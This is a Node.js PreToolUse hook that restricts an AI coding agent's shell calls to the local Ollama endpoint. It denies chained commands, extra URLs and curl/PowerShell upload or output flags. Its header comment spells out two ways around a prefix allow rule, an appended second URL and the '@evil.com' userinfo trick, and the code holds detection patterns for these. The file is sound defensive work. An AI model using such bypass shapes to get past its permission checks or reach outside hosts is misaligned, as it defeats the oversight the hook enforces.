#!/usr/bin/env node
/**
 * ollama-guard-hook.mjs — PreToolUse hook closing the curl/PowerShell multi-URL gap a bare
 * permissions.allow prefix rule can't close on its own.
 *
 * Why this exists (2026-10-21 safe-perms-finish job): buildSafePermissionsSettings() adds
 * Bash/PowerShell allow rules so claude-async jobs can delegate to the local Ollama model
 * (CLAUDE.md's "local model delegation" section) under --permission-mode dontAsk. Claude Code's
 * allow rules are plain prefix matches on the raw command string (see job-core.mjs's own
 * SHELL_ALLOW_PREFIXES) -- there is no suffix anchor. A prefix rule like
 * "Bash(curl http://127.0.0.1:11434/api/generate*)" therefore ALSO matches
 * "curl http://127.0.0.1:11434/api/generate -d x http://evil.com" (curl happily fetches a second
 * positional URL in the same invocation) and, if the rule's prefix is any looser than the full
 * fixed URL, "curl http://127.0.0.1:11434@evil.com" (the userinfo "@" trick: the string starts
 * with the allowed host:port but the real request goes to evil.com). Prefix matching alone cannot
 * express "exactly this one URL and nothing else appended" -- only a hook that actually inspects
 * the full command can.
 *
 * This hook is the belt-and-suspenders companion to that allow rule, same relationship
 * no-background-hook.mjs's deny floor has to permissions.deny: it runs on EVERY tool call
 * (catch-all matcher, same as the other hooks) and only has an opinion on commands that look like
 * an attempt to reach Ollama. For those, it denies anything that isn't EXACTLY the one safe shape
 * (single matching URL, no chaining, no dangerous flags) and otherwise passes -- it never emits an
 * explicit "allow" (see job-tool-gate-hook.mjs's 2026-10-21 fix and RUNBOOK.md: a PreToolUse hook's
 * "allow" is a real grant that bypasses permissions.allow/deny entirely, so a hook may only deny or
 * pass, never allow). The static permissions.allow rule is what actually grants the safe shape;
 * this hook's job is only to deny the bypass shapes that rule's own wildcard would otherwise let
 * through.
 *
 * Contract (same as no-background-hook.mjs):
 *   stdin:  JSON with at least tool_name (string) and tool_input (object).
 *   pass:   print NOTHING, exit 0 (not our concern, or the one safe shape -- let the static
 *           allow/deny floor and other hooks decide).
 *   deny:   print {"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny",
 *           "permissionDecisionReason":<reason>},"systemMessage":<reason>} to stdout, exit 2.
 *
 * Fail closed: any exception, or any command that merely LOOKS like an Ollama attempt (mentions
 * "11434" or "ollama") but doesn't parse as one of the recognized safe shapes below, is denied --
 * never an implicit pass on ambiguous input.
 */
import fs from "node:fs";

const ALLOWED_URLS = new Set([
  "http://127.0.0.1:11434/api/generate",
  "http://localhost:11434/api/generate",
]);

// Any of these anywhere in the raw command string means "this could be more than one command" --
// deny outright rather than try to reason about what runs after them. Catches `;`/`&&`/`||`
// chaining, pipes, backtick/`$(...)` substitution, and redirection (output exfil / overwrite).
const DANGEROUS_OPERATORS = /&&|\|\||[;|`]|\$\(|<\(|>>|<|>/;

// Flags that change curl's behavior in ways the static allow rule must never cover: writing to an
// arbitrary file, uploading a file, following a config file, or multipart form parts that can read
// arbitrary local files.
const DANGEROUS_CURL_FLAGS = /(^|\s)(-o|--output|-O|--remote-name|-T|--upload-file|-F|--form|-K|--config|--trace|--trace-ascii|--libcurl)(\s|=|$)/;

// Flags that change Invoke-RestMethod/Invoke-WebRequest's behavior beyond a simple POST: writing
// the response to disk, or a proxy that could redirect the "local" request elsewhere.
const DANGEROUS_POWERSHELL_FLAGS = /-outfile|-proxy/i;

const URL_PATTERN = /https?:\/\/[^\s"'`]+/g;

function looksLikeOllamaAttempt(command) {
  return /11434|\bollama\b/i.test(command);
}

// Exactly one URL-shaped token in the whole command, and it must be byte-identical to one of the
// two allowed targets. Strips a single trailing quote char some shells leave attached when the URL
// was the last quoted token (the regex itself never captures the opening quote).
function singleExactUrlMatch(command) {
  const matches = command.match(URL_PATTERN) || [];
  if (matches.length !== 1) return false;
  const url = matches[0].replace(/["'`,)]+$/, "");
  return ALLOWED_URLS.has(url);
}

function isSafeCurlCall(command) {
  if (!/\bcurl(\.exe)?\b/i.test(command)) return false;
  if (DANGEROUS_CURL_FLAGS.test(command)) return false;
  return singleExactUrlMatch(command);
}

function isSafePowerShellCall(command) {
  if (!/Invoke-(RestMethod|WebRequest)/i.test(command)) return false;
  if (DANGEROUS_POWERSHELL_FLAGS.test(command)) return false;
  return singleExactUrlMatch(command);
}

// `ollama run <model> [prompt]` / `ollama generate ...` / `ollama list` / `ollama ps` via the CLI
// directly (CLAUDE.md's other delegation path). No URL of its own, so the single-URL check above
// doesn't apply -- the DANGEROUS_OPERATORS check already ruled out chaining into something else,
// and the command must not contain any URL at all (a URL here would mean something unexpected is
// smuggled into the call).
function isSafeOllamaCli(command) {
  if (!/^\s*ollama(\.exe)?\s+(run|generate|list|ps|show)\b/i.test(command)) return false;
  return !/https?:\/\//i.test(command);
}

function decide(input) {
  const toolName = input.tool_name;
  const toolInput = input.tool_input;
  if (typeof toolName !== "string" || toolInput === null || typeof toolInput !== "object") {
    return ["deny", "ollama-guard-hook: malformed PreToolUse hook input (missing tool_name/tool_input); " +
      "denying to fail closed."];
  }

  if (toolName !== "Bash" && toolName !== "PowerShell") return ["pass"];
  const command = toolInput.command;
  if (typeof command !== "string") return ["pass"];
  if (!looksLikeOllamaAttempt(command)) return ["pass"];

  if (DANGEROUS_OPERATORS.test(command)) {
    return ["deny", "ollama-guard-hook: this command mentions Ollama but contains a chaining, " +
      "piping, substitution, or redirection operator, which this hook cannot prove is still a " +
      "single call to the local Ollama endpoint. Re-run the Ollama call as its own standalone " +
      "command, with no other commands or redirections attached."];
  }

  if (isSafeCurlCall(command) || isSafePowerShellCall(command) || isSafeOllamaCli(command)) {
    return ["pass"];
  }

  return ["deny", "ollama-guard-hook: this command mentions Ollama but is not exactly one of the " +
    "recognized safe shapes (a single curl/Invoke-RestMethod/Invoke-WebRequest call with exactly " +
    "one URL, byte-identical to http://127.0.0.1:11434/api/generate or " +
    "http://localhost:11434/api/generate, and no file-writing/upload/config/proxy flags; or a bare " +
    "`ollama run|generate|list|ps|show` CLI call with no URL at all). Denying to fail closed -- " +
    "retry with exactly one of those shapes."];
}

function respond(decision, reason) {
  if (decision === "pass") { process.exitCode = 0; return; }
  const out = { hookSpecificOutput: { hookEventName: "PreToolUse", permissionDecision: decision } };
  if (reason) {
    out.hookSpecificOutput.permissionDecisionReason = reason;
    out.systemMessage = reason;
  }
  process.stdout.write(JSON.stringify(out));
  process.exitCode = decision === "deny" ? 2 : 0;
}

try {
  const raw = fs.readFileSync(0, "utf8");
  const input = JSON.parse(raw);
  const [decision, reason] = decide(input);
  respond(decision, reason);
} catch (e) {
  respond("deny", `ollama-guard-hook: hook script error (${e && e.message}); denying to fail closed.`);
}
